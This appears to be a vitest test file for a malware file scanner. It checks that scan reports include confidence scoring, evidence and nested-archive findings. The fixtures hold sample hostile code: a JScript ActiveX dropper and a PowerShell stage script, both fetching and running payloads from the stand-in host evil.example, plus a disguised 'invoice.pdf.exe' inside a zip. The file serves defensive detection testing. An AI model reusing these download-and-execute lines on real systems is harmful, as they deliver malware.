import fs from "fs/promises";
import os from "os";
import path from "path";
import zlib from "zlib";
import { afterEach, describe, expect, it } from "vitest";
import { scanUploadedFile } from "../src/scanner/fileScanner.js";

const tempRoots = [];

async function createTempFile(fileName, content) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "virovanta-report-evidence-test-"));
  const filePath = path.join(root, fileName);
  tempRoots.push(root);
  await fs.writeFile(filePath, content);
  return filePath;
}

function writeUInt32LE(value) {
  const buffer = Buffer.alloc(4);
  buffer.writeUInt32LE(value >>> 0, 0);
  return buffer;
}

function writeUInt16LE(value) {
  const buffer = Buffer.alloc(2);
  buffer.writeUInt16LE(value, 0);
  return buffer;
}

function buildZipArchive(entries) {
  const localParts = [];
  const centralParts = [];
  let localOffset = 0;

  for (const entry of entries) {
    const nameBuffer = Buffer.from(entry.name, "utf8");
    const sourceBuffer = Buffer.isBuffer(entry.content) ? entry.content : Buffer.from(entry.content);
    const compressedData = zlib.deflateRawSync(sourceBuffer);

    const localHeader = Buffer.concat([
      writeUInt32LE(0x04034b50),
      writeUInt16LE(20),
      writeUInt16LE(0),
      writeUInt16LE(8),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt32LE(0),
      writeUInt32LE(compressedData.length),
      writeUInt32LE(sourceBuffer.length),
      writeUInt16LE(nameBuffer.length),
      writeUInt16LE(0),
      nameBuffer
    ]);

    localParts.push(localHeader, compressedData);

    const centralHeader = Buffer.concat([
      writeUInt32LE(0x02014b50),
      writeUInt16LE(20),
      writeUInt16LE(20),
      writeUInt16LE(0),
      writeUInt16LE(8),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt32LE(0),
      writeUInt32LE(compressedData.length),
      writeUInt32LE(sourceBuffer.length),
      writeUInt16LE(nameBuffer.length),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt32LE(0),
      writeUInt32LE(localOffset),
      nameBuffer
    ]);
    centralParts.push(centralHeader);

    localOffset += localHeader.length + compressedData.length;
  }

  const centralDirectory = Buffer.concat(centralParts);
  const localSection = Buffer.concat(localParts);
  const eocd = Buffer.concat([
    writeUInt32LE(0x06054b50),
    writeUInt16LE(0),
    writeUInt16LE(0),
    writeUInt16LE(entries.length),
    writeUInt16LE(entries.length),
    writeUInt32LE(centralDirectory.length),
    writeUInt32LE(localSection.length),
    writeUInt16LE(0)
  ]);

  return Buffer.concat([localSection, centralDirectory, eocd]);
}

afterEach(async () => {
  const roots = tempRoots.splice(0);
  await Promise.all(roots.map((root) => fs.rm(root, { recursive: true, force: true })));
});

describe("file scanner report evidence model", () => {
  it("adds confidence scoring, rationale, and suspicious-string evidence to file reports", async () => {
    const filePath = await createTempFile(
      "dropper.js",
      Buffer.from(
        'var sh=new ActiveXObject("WScript.Shell"); var x=new ActiveXObject("MSXML2.XMLHTTP"); var s=new ActiveXObject("ADODB.Stream"); x.open("GET","https://evil.example/payload",false); s.SaveToFile("payload.exe"); sh.Run("powershell.exe -enc SQBFAFgA");'
      )
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "dropper.js",
      declaredMimeType: "application/javascript"
    });

    expect(report.confidence?.score).toBeGreaterThan(0);
    expect(["low", "medium", "high"]).toContain(report.confidence?.level);
    expect(report.confidence?.summary).toMatch(/confidence|indicators|coverage/i);
    expect(Array.isArray(report.confidence?.factors)).toBe(true);
    expect(report.engines.classification.score).toBe(report.confidence.score);
    expect(report.findings[0].whyItMatters).toBeTruthy();
    expect(Array.isArray(report.findings[0].evidenceItems)).toBe(true);
    expect(report.findings[0].confidenceImpact).toBeGreaterThan(0);
    expect(report.technicalIndicators?.evidence?.suspiciousStrings?.length).toBeGreaterThan(0);
    expect(report.plainLanguageReasons[0]).toContain(report.confidence.summary);
  });

  it("adds structure anomalies and nested file summaries for archive-backed reports", async () => {
    const archive = buildZipArchive([
      {
        name: "invoice.pdf.exe",
        content: Buffer.from("MZFakePortableExecutable")
      },
      {
        name: "docs/stage.ps1",
        content: Buffer.from('Start-BitsTransfer -Source "https://evil.example/a.ps1" -Destination "$env:TEMP\\a.ps1"; Invoke-Expression (New-Object Net.WebClient).DownloadString("https://evil.example/b.ps1")')
      }
    ]);

    const filePath = await createTempFile("bundle.zip", archive);
    const report = await scanUploadedFile({
      filePath,
      originalName: "bundle.zip",
      declaredMimeType: "application/zip"
    });

    expect(Array.isArray(report.technicalIndicators?.evidence?.structureAnomalies)).toBe(true);
    expect(report.technicalIndicators.evidence.structureAnomalies.some((entry) => /archive|extension|masquerad/i.test(entry.label))).toBe(true);
    expect(Array.isArray(report.technicalIndicators?.evidence?.nestedFiles)).toBe(true);
    expect(report.technicalIndicators.evidence.nestedFiles.some((entry) => entry.name === "docs/stage.ps1")).toBe(true);
    expect(report.technicalIndicators.archive.extractedItemCount).toBeGreaterThan(0);
  });
});
